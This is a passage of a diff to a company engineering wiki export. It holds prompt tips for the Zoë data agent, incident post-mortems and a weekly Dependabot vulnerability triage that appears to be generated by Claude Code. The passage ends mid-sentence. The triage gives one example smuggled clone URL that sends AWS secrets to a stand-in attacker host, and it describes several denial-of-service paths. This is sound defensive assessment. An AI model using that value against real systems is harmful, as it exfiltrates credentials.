make sure Zoë follows them. For example, if you’re trying to get Zoë to ask a follow up question for a time period on a large table saying:\n```\nAsk for a time period if not given one.\n```\nWill not work as well as:\n```\nWhen asked a question that does not contain a time period filter, you must ALWAYS ask the user for the time period they want to use to view the data.\n```\nUsing bullet points or wrapping additional logic under a “Guidelines” header is also helpful. A good example is:\n```\nAdditional Guidelines:\n- The acronym FFDC refers to the marketing function at our company. When users ask for that, interpret it as the word marketing.\n- When the user asks a question in a non-English language, you must ALWAYS respond in the same language in which you were asked the question.\n- When the user asks a question without a time period specified, you must ALWAYS ask a follow-up question to make them pick a time period.\n```",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:03:07.564Z"
+      "lastUpdated": "2026-09-13T02:08:36.262Z"
     },
     {
       "id": "1baa8dad-05ac-80ac-a8c5-e7fd0cb47f54",
@@ -1087,7 +1087,7 @@
       "parent": "Engineering Wiki",
       "content": "---\nAt Zenlytic, we believe the best insights come from matching the right tool to the right task. That’s why we’ve expanded Zoë, our conversational AI data agent, to support multiple AI models, letting users choose based on their specific needs.\nNot all AI models are the same. Some provide quick, straightforward answers, ideal for immediate insights on questions like, “What’s our top-selling product this month?” Others excel in structured problem-solving and are best for complex queries, such as analyzing deep customer trends or forecasting how new tariffs will affect production needs.\nBy empowering users to select the AI model suited to their query, Zoë ensures accuracy, speed, and relevance. Whether you need instant clarity or advanced analytical insights, Zoë provides the right tool every time you “Just Ask.”\nAvailable AI Models:\n• GPT-4o: Balanced model — great for answering straightforward questions like, “What’s our top-selling product this month?”\n• GPT-o1: Advanced reasoning model — ideal for complex, detailed analyses such as, “What factors are driving customer churn over the past quarter?”\n• Claude 3.5 Sonnet: Balanced model — suitable for quick insights and mid-level analytical tasks, like identifying sales trends.\n• Claude 3.7 Sonnet: Advanced exploratory model — best for deep dives, exploratory analysis, and nuanced insights. Highly intelligent but tends to be more verbose, making it excellent for comprehensive understanding.",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:03:08.277Z"
+      "lastUpdated": "2026-09-13T02:08:36.976Z"
     },
     {
       "id": "1d1a8dad-05ac-808e-84b0-ff824335fc9a",
@@ -1097,7 +1097,7 @@
       "keywords": [
         "sso"
       ],
-      "lastUpdated": "2026-08-02T03:03:09.288Z"
+      "lastUpdated": "2026-09-13T02:08:37.674Z"
     },
     {
       "id": "281a8dad-05ac-8064-b33d-dbab315a8baf",
@@ -1107,7 +1107,7 @@
       "keywords": [
         "integration"
       ],
-      "lastUpdated": "2026-08-02T03:03:10.593Z"
+      "lastUpdated": "2026-09-13T02:08:38.449Z"
     },
     {
       "id": "348a8dad-05ac-8072-931d-dce1a9f19c74",
@@ -1115,7 +1115,7 @@
       "parent": "Engineering Wiki",
       "content": "# Development\n# Customers\n## Customer documentation sync for Zoë in VPC\nSource: Paul Blankley in Slack on 2026-06-30. Slack thread.\nCustomers can replicate Zenlytic documentation inside their own environment by downloading the full docs package that mirrors docs.zenlytic.com: https://github.com/Zenlytic/zenlytic-docs/releases/latest/download/docs.zip.\n• Download the latest docs.zip release and sync/unzip the contents into a customer-controlled GitLab repository inside their environment.\n• Use the GitLab MCP server to expose that repository to Zoë as an MCP-accessible documentation source.\n• Add a system-prompt instruction telling Zoë to use that MCP tool when searching Zenlytic documentation, because this is not Zoë’s default documentation lookup path.",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:03:11.281Z"
+      "lastUpdated": "2026-09-13T02:08:39.310Z"
     },
     {
       "id": "341a8dad-05ac-8039-83fb-e017f85504d8",
@@ -1126,7 +1126,7 @@
         "sso",
         "logging"
       ],
-      "lastUpdated": "2026-08-02T03:03:12.640Z"
+      "lastUpdated": "2026-09-13T02:08:39.682Z"
     },
     {
       "id": "348a8dad-05ac-8016-b047-fcd7889f999b",
@@ -1134,7 +1134,7 @@
       "parent": "VPC deployments",
       "content": "Verizon prod deployments are targeted for every Thursday. \n## Customer documentation sync for Zoë in VPC\nSource: Paul Blankley in Slack on 2026-06-30. Slack thread.\nCustomers can replicate Zenlytic documentation inside their own environment by downloading the full docs package that mirrors docs.zenlytic.com: https://github.com/Zenlytic/zenlytic-docs/releases/latest/download/docs.zip.\n• Download the latest docs.zip release and sync/unzip the contents into a customer-controlled GitLab repository inside their environment.\n• Use the GitLab MCP server to expose that repository to Zoë as an MCP-accessible documentation source.\n• Add a system-prompt instruction telling Zoë to use that MCP tool when searching Zenlytic documentation, because this is not Zoë’s default documentation lookup path.",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:03:13.296Z"
+      "lastUpdated": "2026-09-13T02:08:40.269Z"
     },
     {
       "id": "50eba629-62a7-44ff-8052-4577a5b79ce0",
@@ -1144,7 +1144,7 @@
       "keywords": [
         "aws"
       ],
-      "lastUpdated": "2026-08-02T03:03:14.140Z"
+      "lastUpdated": "2026-09-13T02:08:41.029Z"
     },
     {
       "id": "1cea8dad-05ac-801c-8359-c678d80a9d81",
@@ -1154,7 +1154,7 @@
       "keywords": [
         "aws"
       ],
-      "lastUpdated": "2026-08-02T03:03:14.843Z"
+      "lastUpdated": "2026-09-13T02:08:42.131Z"
     },
     {
       "id": "1cea8dad-05ac-8006-a808-c75cb3c4a862",
@@ -1178,7 +1178,7 @@
         "network",
         "monitoring"
       ],
-      "lastUpdated": "2026-08-02T03:03:15.495Z"
+      "lastUpdated": "2026-09-13T02:08:42.807Z"
     },
     {
       "id": "18aa8dad-05ac-80e9-92c8-ea352eb3c635",
@@ -1188,7 +1188,7 @@
       "keywords": [
         "integration"
       ],
-      "lastUpdated": "2026-08-02T03:03:16.220Z"
+      "lastUpdated": "2026-09-13T02:08:43.449Z"
     },
     {
       "id": "65edf3cb-a5d6-4e7b-a920-3cfbe8a53cfa",
@@ -1196,7 +1196,7 @@
       "parent": "Engineering Wiki",
       "content": "# Frontend\n☐ Update AG Grid License on prod once stage looks good\n# Backend\n☐ Broadly speaking to be prod ready, there should be no errors on any of the dashboards\n☐ Bottom rows still showing up as empty\n☐ Row Totals aren’t working\n☐ SQL Question is not working\n☐ Question specific errors aren’t working. This is suppose to tell the user that they need to select steps in the funnel. Check the dashboard as its seem to be all question types\n☐ Download dashboard as PDF is failing\n☐ Personal fields don’t seem to be working\n☐ Offset table calc not working in pivoted table\n☐ Percent Total on Pivots not working as expected. See ticket",
       "keywords": [],
-      "lastUpdated": "2026-08-02T03:03:17.040Z"
+      "lastUpdated": "2026-09-13T02:08:44.289Z"
     },
     {
       "id": "28fa8dad-05ac-803b-b68c-fa93c32a44dc",
@@ -1206,7 +1206,7 @@
       "keywords": [
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:03:17.697Z"
+      "lastUpdated": "2026-09-13T02:08:44.918Z"
     },
     {
       "id": "28fa8dad-05ac-805a-9b7f-efcef3ef5612",
@@ -1216,7 +1216,7 @@
       "keywords": [
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:03:18.333Z"
+      "lastUpdated": "2026-09-13T02:08:45.323Z"
     },
     {
       "id": "28fa8dad-05ac-80b6-a92a-f804712ff563",
@@ -1226,7 +1226,7 @@
       "keywords": [
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:03:18.948Z"
+      "lastUpdated": "2026-09-13T02:08:45.881Z"
     },
     {
       "id": "2e2a8dad-05ac-80e5-85c0-e6a399502072",
@@ -1236,7 +1236,7 @@
       "keywords": [
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:03:19.594Z"
+      "lastUpdated": "2026-09-13T02:08:46.361Z"
     },
     {
       "id": "323a8dad-05ac-8109-946b-f3cb71713079",
@@ -1252,31 +1252,70 @@
         "network",
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:03:20.861Z"
+      "lastUpdated": "2026-09-13T02:08:47.345Z"
+    },
+    {
+      "id": "3b2a8dad-05ac-803a-af08-eedcb8b41983",
+      "title": "Incidents",
+      "parent": "Engineering Wiki",
+      "content": "Template\nIncidents",
+      "keywords": [
+        "incident"
+      ],
+      "lastUpdated": "2026-09-13T02:08:48.110Z"
     },
     {
       "id": "32da8dad-05ac-81cb-8044-f961ab1d6706",
       "title": "Incident Post-Mortem Template",
-      "parent": "Engineering Wiki",
-      "content": "Incident Title: [e.g., \"API latency spike — 2026-03-24\"]\nSeverity: P0 / P1 / P2 / P3\nDate: YYYY-MM-DD\nDuration: Start → End (total minutes/hours)\nLead: [Name]\n---\n## Summary\n1–2 sentences. What happened, who was affected, how bad was it.\n---\n## Timeline\nChronological list of key events: detection, escalation, mitigation, resolution.\n---\n## Root Cause\nWhat actually broke and why.\n---\n## Impact\nUsers affected, revenue impact, SLA breach, etc.\n---\n## Action Items\n---\n## Lessons Learned\nWhat went well, what didn't, what was lucky.",
+      "parent": "Incidents",
+      "content": "Incident Title: [e.g., \"API latency spike — 2026-03-24\"]\nSeverity: P0 / P1 / P2 / P3\nDate: YYYY-MM-DD\nDuration: Start → End (total minutes/hours)\nLead: [Name]\n---\n## Summary\n1–2 sentences. What happened, who was affected, how bad was it.\n---\n## Timeline\nChronological list of key events: detection, escalation, mitigation, resolution.\n---\n## Root Cause\nWhat actually broke and why.\n---\n## Impact\nUsers affected, revenue impact, SLA breach, etc.\n---\n## Lessons Learned\n## Action Items\n---\nWhat went well, what didn't, what was lucky.",
       "keywords": [
         "incident",
         "breach",
         "sso",
         "api"
       ],
-      "lastUpdated": "2026-08-02T03:03:21.655Z"
+      "lastUpdated": "2026-09-13T02:08:48.458Z"
+    },
+    {
+      "id": "3b2a8dad-05ac-80ff-b027-f817c583a6f5",
+      "title": "07-31-26: Cognito Identity Pool ID Removed",
+      "parent": "Incidents",
+      "content": "Severity: P1\nDate: 2026-07-31\nDuration: ~17h 38m (21:54:52 Jul 31 → 15:32:59 Aug 1)\nLead: Noah Fidel\n---\n## Summary\nSSO/federated Login (Google, Okta, Entra, and the Microsoft Teams tab) was broken for all users. If  user logged out during the incident timeframe, they wouldn’t be able to log in.\n---\n## Timeline\n• Fri Jul 31, 4:43 PM ET — PR #8570 merges, drops the identity pool ID build arg.\n• Fri Jul 31, 5:54 PM ET — Bad build live in prod\n• Sat Aug 1, 11:15 AM ET — Hotfix merges\n• Sat Aug 1, 11:32 AM ET — Fixed build live in prod\n---\n## Root Cause\nPR #8570 (\"fix CI/CD: remove lookups for nonexistent SSM keys\"), merged to master 2026-07-31 21:44 UTC, refactored scripts/build_images_github_actions.sh to stop fetching several SSM parameters believed to be unused. REACT_APP_IDENTITY_POOL_ID was mistakenly included in that cleanup — both the aws ssm get-parameter lookup and the corresponding --build-arg passed to thefrontend Docker build were removed, even though the value is still consumed by the app.\nBecause services/front_end/Dockerfile-prod declares ARG REACT_APP_IDENTITY_POOL_ID=none as a fallback default, the missing build-arg didn't fail the build — Docker silently substituted the literal string 'none' in place of a real pool ID. That value gets baked into the deployed bundle's env.js (via generate-env-js.sh) and passed to Amplify.configure() in services/front_end/src/index.jsx, so every production frontend build from 2026-07-31 21:54 UTC onward shipped with an invalid Cognito Identity Pool ID.\nNo CI step validates that required frontend config values are present and well-formed before a build is deployed, so this reached prod undetected and stayed live for ~17h38m until the fix\nmerged to master and deployed (2026-08-01 15:23–15:33 UTC).\n---\n## Impact\nHard to measure — this failure has almost no instrumentation anywhere in the stack. SSO/federated login (Google, Okta, Entra) and the Teams tab would fail during the ~17h38m window, since Amplify's OAuth callback blocks on the Identity Pool exchange and throws with the broken pool ID, silently bouncing users back to login; password login was unaffected. But Cognito Identity Pool calls aren't in CloudTrail, the OAuth exchange isn't visible the way password logins are, and Amplify swallows the failure before it reaches Sentry or our logs — so we can't confirm actual scope. No customers reported it, but absent logs, that's \"unmeasured,\" not \"confirmed zero.”\n---\n## Action Items\n---\n## Lessons Learned\nGood - We had a very short time to resolution after identifying the issue, due a fast CI process (<15m).\nBad - Whether a change gets scrutiny before merge depends on the author (or reviewer, when one is engaged) implicitly judging their own change as low-impact. The person closest to a change is also the person least positioned to see its blind spots.\nBad - Individual per-commit impact assessments don’t compose, so when merging to master, the release manager is not fully aware of the potential impacts.\nBad - no observability on this failure mode\nBad - no automation to tell us it was broken; detection was manual",
+      "keywords": [
+        "incident",
+        "sso",
+        "aws"
+      ],
+      "lastUpdated": "2026-09-13T02:08:49.142Z"
+    },
+    {
+      "id": "3b2a8dad-05ac-80ec-b257-c918f994ba8e",
+      "title": "🚨08-04-26 API Gateway Production Outage",
+      "parent": "Incidents",
+      "content": "Incident Title: API Gateway rollout: prod backend unreachable via APISIX\nSeverity: P1\nDate: 2026-08-04\nDuration: 22:24 UTC → 22:50 UTC (~26 minutes)\nLead: Sebastian\n---\n## Summary\nDuring the initial rollout of APISIX (api-gateway) to production, an ALB listener rule at priority 97 was created that immediately intercepted all traffic to api.zenlytic.com. APISIX could not resolve the backend upstream (backend.prod.internal) because the backend ECS service had never been registered with AWS Cloud Map (service discovery was defined in Terraform but had never been applied). All API requests returned 503 for approximately 26 minutes until the backend was registered in Cloud Map and a new deployment propagated.\n---\n## Timeline\n---\n## Root Cause\nTwo gaps in the Terraform apply sequence:\n- aws_service_discovery_service.backend had never been created in prod. The Cloud Map service record for backend in the prod.internal namespace did not exist, so backend.prod.internal was an unresolvable hostname.\n- aws_ecs_service.main (the backend) had never been updated with service_registries. Even after creating the Cloud Map service, existing ECS tasks do not retroactively register themselves. A forced redeployment was required to trigger registration.\nThe api-gateway rollout was planned as a targeted terraform apply covering only the new resources (ElastiCache, ECS service, ALB target group + listener rule). The Cloud Map and backend ECS service dependencies were not included in the target list, and their absence was not caught during the plan review because they were in a separate part of the module.\n---\n## Impact\n• All authenticated API requests to api.zenlytic.com returned 503 for ~26 minutes.\n• Users on app.zenlytic.com could not load data, send queries, or use any backend feature.\n• euapi.zenlytic.com (prod-eu) was not affected during this window — the prod-eu rollout was completed after the root cause was understood and the correct apply sequence was followed.\n• MCP traffic (mcp.zenlytic.com) was also intercepted by the listener rule and similarly returning 503 during the window.\n---\n## Lessons Learned\nWhat went well:\n• Root cause was identified quickly (<10 min) from CloudWatch logs the DNS error message was clear.\n• The fix was non-destructive: no data loss, no ECS service recreation required.\n• prod-eu was handled correctly after the root cause was understood (applied Cloud Map and service_registries before the api-gateway listener rule took effect).\nWhat didn't go well:\n• The terraform apply for the api-gateway listener rule was run before verifying all upstream dependencies (Cloud Map, service_registries) were in place.\n• The targeted apply list did not include aws_service_discovery_service.backend and the backend ECS service update — these were implicitly assumed to already exist.\n---\n## Action Items",
+      "keywords": [
+        "incident",
+        "sso",
+        "aws",
+        "api"
+      ],
+      "lastUpdated": "2026-09-13T02:08:49.874Z"
     },
     {
       "id": "37aa8dad-05ac-80b1-af2b-d10c583f988b",
       "title": "Critical & High CVSSv3 Triage ",
       "parent": "Engineering Wiki",
-      "content": "# Critical Dependabot Alerts — Triage\nTriage of all open critical-severity GitHub Dependabot alerts as of June 9, 2026 (repo: Zenlytic/zenlytic). Each alert was assessed against the actual code path that consumes the dependency to determine whether the vulnerability is exploitable in our system.\nSummary: 5 open critical alerts; 0 materially exploitable among the open set. The previously-material redshift-connector RCE (#624) was remediated June 9, 2026. The remaining 5 are dev-only or transitive dependencies whose vulnerable code paths are unreachable given how we use them, and can be cleared through routine dependency upgrades.\n# High Dependabot Alerts — Triage\nTriage of all ~142 open high-severity alerts (~44 distinct packages) as of July 27, 2026 (last reconciled July 20, 2026). Duplicate alerts for the same advisory across version ranges/manifests are consolidated into one row. Tables are grouped by service.\nMaterially exploitable: 2 findings — both NEW this week: Pillow #704 (JPEG2000 tiled-decode DoS on user-uploaded chat images, back_end) and GitPython #725/#724 (env-var exfiltration via customer-settable clone URL, back_end + git_store). The two prior material findings (SAML-ACS DoS #660/#662) remain remediated (June 26, 2026). See summary at the bottom. Everything else is dev/build tooling, unreachable code paths, or requires preconditions our code verifiably doesn't have.\n## Frontend — axios (29 alerts, 15 distinct advisories)\nContext: the frontend is a browser SPA. Its direct dependency is axios 0.21.1 (March 2021); axios 1.x copies come transitively via aws-amplify and vite-plugin-mkcert (dev). Verified code facts: axios is called in 14 files with fixed endpoints (config.apiGateway.URL + hardcoded paths) and JWT headers from makeHeaders(); no axios.create, interceptors, baseURL, xsrfCookieName, or untrusted config objects anywhere.\nAction: upgrade the direct axios dependency from 0.21.1 to ≥1.16.0 (our usage is plain axios.get/post(url, data, {headers}) — modest migration) and bump aws-amplify; this clears all 29 alerts.\n## Frontend — other runtime npm packages\nContext: routing is React Router Data Mode, client-only (createBrowserRouter with one catch-all route; zero loaders/actions/SSR — verified). Charts: vega-lite specs arrive from the backend/LLM (vega_config in questionApi.ts) and are compiled and embedded verbatim in QuestionResultChartVega.tsx.\n## Frontend — dev tooling\n## Renderer service (headless-Chrome screenshot Lambda)\nContext: the renderer navigates only to hardcoded Zenlytic URLs, loads config from our own S3 bucket, and writes output back to S3. No proxies, no FTP, no untrusted tar extraction, no websocket server (verified in services/renderer/index.js).\n## Backend (main FastAPI service) — Python\n## Git store & Lambda services — Python\nContext: git_store is internal-only (reachable only from the backend at git-store:8000; no nginx/public route). The Lambda is a cron app that only calls our own internal API.\n## Summary — High severity\n~142 open alerts → ~60 distinct advisories. 2 materially exploitable findings (both new this week; see the July 27, 2026 reconcile below). Both findings that were open last week — python-multipart #660 and starlette #662 (unauthenticated DoS via the public SAML ACS endpoint) — were remediated on June 26, 2026 (commit efb43ffda4: back_end bumped to python-multipart 0.0.30 + starlette 1.3.1 + fastapi 0.133.1). The original triage detail is retained below as the audit trail (both now resolved):\n- python-multipart quadratic urlencoded DoS (#660) — the public/unauthenticated SAML ACS endpoint (saml_providers/routes.py, Auth(public=True)) parses application/x-www-form-urlencoded via Form(); a tiny ;-separated body triggers O(n²) CPU → unauthenticated worker-exhaustion DoS. Fix: bump python-multipart to ≥0.0.30.\n- starlette request.form() limit-bypass DoS (#662) — same public SAML ACS endpoint; request.form() ignores field/size limits for urlencoded bodies, so an oversized body blocks the event loop / exhausts memory. Fix: bump starlette to ≥1.3.1 (needs a fastapi bump).\nMaterial findings remediated in earlier reconciles: vega-functions #373 (vega 6 upgrade), pillow #418/#561/#530 (12.2.0), storybook #441 (≥8.6.17), python-multipart #602 (≥0.0.27), python-multipart #660 + starlette #662 (back_end fastapi/starlette/multipart bump, June 26, 2026).\nJune 24, 2026 reconcile: no new critical/high alerts opened and none closed since June 16. Open set unchanged (5 critical / 107 high). The two material SAML-ACS DoS findings (#660, #662) remain open — re-verified the public saml_acs() Form() code path and the still-vulnerable installed versions (python-multipart 0.0.27 < 0.0.30, starlette 0.49.1 < 1.3.1). Note: the esbuild #653 row (GHSA-gv7w-rqvm-qjhr) references an alert that does not exist in the repo (API 404; no such advisory alert) — it was added in error and is not a tracked vulnerability.\nEverything else is non-material: Node-adapter/proxy code that never runs in a browser SPA (all axios), SSR/Framework-mode features we don't use (react-router), dev/build/test tooling on trusted input (minimatch, picomatch, eslint/storybook/vite chains, black, wheel, setuptools), unreachable APIs (GitPython config_writer, lodash _.template, glob CLI, DTLS, SECT curves, ecdsa signing), orphaned lockfile entries that aren't even installed (fast-uri, serialize-javascript), trusted-source-only inputs (renderer tar/FTP/ws, urllib3 to AWS, pyarrow streams), or already-patched versions with stale alerts (lxml). Recommended hygiene sweep: bump axios to ≥1.16, react-router-dom to ≥7.15, aws-amplify, GitPython to ≥3.1.50, orjson, urllib3, storybook, vite; remove dead deps (terser@3.14.1, react-cookie-consent, customize-cra chain); regenerate the frontend lockfile to drop orphaned webpack-era entries.\nJune 29, 2026 reconcile: Open set is now 5 critical / 104 high (down from 5 / 107 on June 24). The two material findings that were open last week — python-multipart #660 and starlette #662 (unauthenticated DoS via the public SAML ACS endpoint) — were remediated June 26, 2026 via commit efb43ffda4 (\"bump fastapi, starlette and python-multipart for critical vuln remediation\"); back_end poetry.lock now pins python-multipart 0.0.30, starlette 1.3.1, fastapi 0.133.1 (verified). The non-material starlette StaticFiles-UNC alert #656 closed in the same bump. No new critical or high alerts opened this week, and there are now 0 materially-exploitable open findings across both severities. git_store still runs the older vulnerable versions (python-multipart 0.0.17, starlette 0.46.2 → alerts #681/#683/#677/#601/#411/#407/#409 remain open) but it is internal-only (no public route), so those stay non-material. The esbuild #653 row remains a phantom (no such alert in the repo; tracked in error).\nJuly 6, 2026 reconcile: Open set unchanged since June 29 — 5 critical / 104 high, 0 materially exploitable. No new critical or high alerts opened and none closed this week. No dependency manifest/lockfile changed on dev since June 29, so all installed-version facts in the rows above still hold; re-verified back_end pins python-multipart 0.0.30 / starlette 1.3.1 / fastapi 0.133.1 (the June 26 material-fix commit efb43ffda4). Spot-checked the week's code diff for verdict-relevant drift: git_store untouched; renderer change only makes its S3 bucket name env-configurable (still our own bucket); no new Form()/multipart endpoints, no new axios config patterns (create/interceptors/baseURL), no react-router loaders/actions/redirect(), no _.template usage introduced. Bookkeeping note: the axios rows above cite five package.json-manifest duplicate alerts (#652, #651, #645, #643, #641) that GitHub actually auto-closed June 10–12, 2026 — they are duplicates of still-open yarn.lock alerts for the same advisories, so the 24 remaining open axios alerts and the row verdicts are unaffected. The recommended hygiene sweep (axios ≥1.16, react-router-dom ≥7.15, aws-amplify, GitPython ≥3.1.50, git_store fastapi/starlette/multipart parity bump, dead-dep removal, lockfile regeneration) remains the fastest way to burn down the non-material backlog.\"\nJuly 13, 2026 reconcile: Open set is 5 critical / 103 high, 0 materially exploitable. No new critical or high alerts opened, and no alerts actually closed — the API shows zero fixed/dismissed/auto-dismissed high alerts since June 29. The count change (104 → 103) is a bookkeeping correction only: axios dup alert #628, cited in the axios Node-adapter row, does not exist in the repo in any state (API 404 — a phantom reference like esbuild #653), so last week's 104 overcounted by one; the true open axios count is 23 alerts and no row verdicts change. No dependency manifest/lockfile changed on dev since July 6, so all installed-version facts above still hold (back_end still pins python-multipart 0.0.30 / starlette 1.3.1 / fastapi 0.133.1; git_store still on its older internal-only versions). Spot-checked the week's code diff for verdict-relevant drift: no new Form()/multipart/request.form() endpoints, no GitPython config_writer/multi_options usage, no new axios config patterns (create/interceptors/baseURL/xsrfCookieName), no react-router loaders/actions/redirect(), no _.template, no window.vega/VEGA_DEBUG. The recommended hygiene sweep (axios ≥1.16, react-router-dom ≥7.15, aws-amplify, GitPython ≥3.1.50, git_store fastapi/starlette/multipart parity bump, dead-dep removal, frontend lockfile regeneration) remains outstanding and is still the fastest way to burn down the non-material backlog.\nJuly 20, 2026 reconcile: Open set is 5 critical / 105 high, 0 materially exploitable. Two new high alerts opened this week, both frontend and both triaged non-material (rows added above): js-yaml #691 (quadratic merge-key DoS — direct runtime dep whose load() only ever parses the workspace's own data-model YAML; client-side availability-only) and brace-expansion #690 (exponential-expansion DoS — vulnerable 2.0.1 copy lives only under lint/build toolchains). No alerts closed or dismissed. No dependency lockfile changed on dev; re-verified back_end still pins python-multipart 0.0.30 / starlette 1.3.1 / fastapi 0.133.1, and git_store its older internal-only versions (python-multipart 0.0.17, starlette 0.46.2, GitPython 3.1.45). Verdict-relevant drift: the MCP-server work (commit 71333df7f4) added a new public/unauthenticated POST /oauth/token endpoint with Form(...) params in back_end (api/v2/oauth/routes.py) — a new unauthenticated form-parsing surface, but the patched python-multipart/starlette pins already cover it, so no new material finding; git_store and renderer had zero commits; no new axios config patterns, react-router loaders/actions/redirect(), _.template, or window.vega/VEGA_DEBUG in the frontend diff; the public SAML ACS endpoint is unchanged. Scope note: 71333df7f4 also added a new manifest services/mcp_server/pyproject.toml (mcp[cli], httpx, no lockfile) — future sweeps must include this new service. Quick win: the one-line yarn upgrade js-yaml@^4.3.0 closes #691; the broader hygiene sweep (axios ≥1.16, react-router-dom ≥7.15, aws-amplify, GitPython ≥3.1.50, git_store fastapi/starlette/multipart parity bump, dead-dep removal, frontend lockfile regeneration) remains outstanding.\nJuly 27, 2026 reconcile: Open set is 5 critical / 142 high, 2 materially exploitable — the first non-zero material count since the SAML-ACS findings were remediated June 26, 2026. 37 new high alerts opened this week (a large Pillow + GitPython advisory wave); none closed or dismissed. No dependency lockfile changed on dev since July 20, so all prior installed-version facts still hold (back_end still pins python-multipart 0.0.30 / starlette 1.3.1 / fastapi 0.133.1; git_store still on its older internal-only versions).\nTwo new material findings (both remediation-worthy):\n- Pillow #704 (CVE-2026-59204, JPEG2000 tiled-decode DoS) — reachable via the same unrestricted Image.open(io.BytesIO(...)) on user-uploaded chat images (conversation_processor.py:831, no formats= restriction) that made #418/#530 material; a JP2 renamed .png passes the extension gate and forces a full decode server-side. Availability-only, authenticated. Fix: bump Pillow 12.2.0 → 12.3.0 (clears all 10 new Pillow alerts #694–#705).\n- GitPython #725 (back_end) + #724 (git_store) (GHSA-rwj8-pgh3-r573, env-var exfiltration) — Repo.clone_from() runs os.path.expandvars() on the clone URL, and customer-settable workspace.github_url reaches it unvalidated both in-process in back_end (metrics_layer/.../github_repo.py:212,222) and via git_store (main.py:1202,1211). A workspace admin (edit_settings) can set github_url = https://attacker.tld/$AWS_SECRET_ACCESS_KEY.git to leak backend/git-store process-env secrets (AWS creds, DB URL, encryption/LLM keys) to an attacker host — customer tenant → Zenlytic infra. Fix: bump both poetry.locks to ≥3.1.52 (≥3.1.55 clears the whole 9-alert GitPython wave); harden by validating github_url on write in ModifyWorkspaces.patch (workspace.py:1097-1103).\nStructural note: back_end is no longer GitPython-free — it clones customer repos in-process via the vendored metrics_layer GithubRepo, so back_end GitPython alerts (#716/720/723/725/727-731) can no longer be dismissed as dev/unused. This is a new manifest cluster.\nThe other 35 new alerts are non-material: the remaining 9 Pillow advisories (RankFilter/paste/crop/ImageCms/font/GD/McIdas/PDF decoders never reached on the backend path); the 8 other GitPython advisories in the wave (clone options hardcoded, refs git-validated, config_writer/create_remote unreached — thinnest margins are #728 diff --output and #730 single-char-kwarg smuggling); pyasn1 #707/#708 (transitive DoS, no untrusted ASN.1 decode); sharp #722 (only inside the network-blocked Modal code-interpreter microVM that already runs arbitrary LLM code unprivileged); react-router #735 (Framework/SSR-mode-only per the advisory; we run Data Mode client-only); postcss #732/#736 (dev/build tooling on repo-authored CSS); brace-expansion #692/#737 and fast-uri #714/#726 (folded into existing rows — lint/build toolchains, and an orphaned uninstalled lockfile entry, respectively). Both new material code paths were re-verified to exist as described.\nFastest burndown: Pillow → 12.3.0 and GitPython → ≥3.1.55 in both back_end and git_store poetry.locks resolve both material findings plus 17 non-material alerts in two lockfile bumps; the standing hygiene sweep (axios ≥1.16, react-router-dom ≥7.18, aws-amplify, git_store fastapi/starlette/multipart parity bump, dead-dep removal, frontend lockfile regeneration) remains outstanding.",
+      "content": "> 🛡️ How this doc is produced: the weekly reconcile is run by the Claude Code slash command /dependabot-triage. The skill text is mirrored at Dependabot Triage — Claude Code skill (/dependabot-triage); the canonical source is .claude/commands/dependabot-triage.md in the Zenlytic/zenlytic repo.\n# Critical Dependabot Alerts — Triage\nTriage of all open critical-severity GitHub Dependabot alerts as of June 9, 2026 (repo: Zenlytic/zenlytic). Re-verified September 8, 2026 — open critical set unchanged since June 9, 2026 (5 alerts: #490, #452, #439, #331, #332; 0 material). Installed versions re-checked against origin/dev lockfiles Sept 8: happy-dom 15.11.7, fast-xml-parser 4.4.1/4.5.3, basic-ftp 5.0.5, form-data 3.0.3/4.0.2 — all still inside the vulnerable ranges (none stale); renderer and its lockfile had zero commits, and the frontend lockfile's only movement this week was the addition of highcharts 13.0.2 + highcharts-react-official 3.2.3. Each alert was assessed against the actual code path that consumes the dependency to determine whether the vulnerability is exploitable in our system.\nSummary: 5 open critical alerts; 0 materially exploitable among the open set. The previously-material redshift-connector RCE (#624) was remediated June 9, 2026. The remaining 5 are dev-only or transitive dependencies whose vulnerable code paths are unreachable given how we use them, and can be cleared through routine dependency upgrades.\n# High Dependabot Alerts — Triage\nTriage of all 150 open high-severity alerts (48 distinct package/manifest clusters, 122 distinct advisories) as of September 8, 2026 (last reconciled August 31, 2026). Duplicate alerts for the same advisory across version ranges/manifests are consolidated into one row. Tables are grouped by service.\nMaterially exploitable: 0 findings. GitPython #724 (git_store, GHSA-rwj8-pgh3-r573, env-var exfiltration via clone URL) was provisionally flipped to YES during the September 8 run — commit 76c5cf7dab (#8897, \"Conversation-scoped Git V2 backend\") added a back_end /api/v2/workspaces/{id}/vcs/* router that drives git_store on 12 of its 14 routes with only Auth(data_model_edit), cloning the customer-settable, unvalidated workspace.github_url through git_store's GitPython 3.1.45, whose Repo.clone_from runs os.path.expandvars() on the URL — and reverted to NO the same day on product confirmation that git_store is not used anywhere in production. The code path is real and fully traced in the #724 row; the non-material verdict for the whole git_store cluster now rests on that deployment fact rather than on the git-store-microservice flag, so it must be re-derived before git_store or the /vcs routes are ever put into production use. The lock-only bump of services/git_store/poetry.lock to GitPython ≥3.1.58 (closes #724 and the other 18 git_store GitPython alerts) remains the recommended pre-emptive fix. See the September 8 reconcile at the bottom. September 8 also brought 13 new high alerts, all non-material (thrift ×2, browserslist ×2, @faker-js/faker, nanoid #786, fast-uri #793/#794 on the orphaned front_end entry, fast-uri ×4 in the new services/mcp_server/ui manifest, and cryptography #802 re-issuing #749) and one closure (#749, removed by GitHub and re-issued as #802). (History:) The two material findings from August 24 — sqlparse #780 and #781 (authenticated CPU-exhaustion DoS at the lowest role via unvalidated dynamic-field SQL) — were remediated August 25, 2026 (commit 28c96babf9: sqlparse 0.5.5 → 0.6.0 plus ingest validation of dynamic_field.sql), and all three sqlparse alerts (#779/#780/#781) are closed. August 31, 2026: 8 alerts closed this week — the first closures in five weeks (sqlparse #779/#780/#781 fixed Aug 25; back_end GitPython #765/#766/#768/#769/#770 fixed Aug 27 via gitpython 3.1.57 → 3.1.60, commit 7616c3cf3d) and zero new alerts opened. See the August 31 reconcile at the bottom. August 17, 2026: 5 new high alerts opened — fast-uri #774/#775 (GitHub re-issued advisories against the same orphaned lockfile entry), nanoid #773/#777 (Vite/PostCSS build chain), and extract-zip 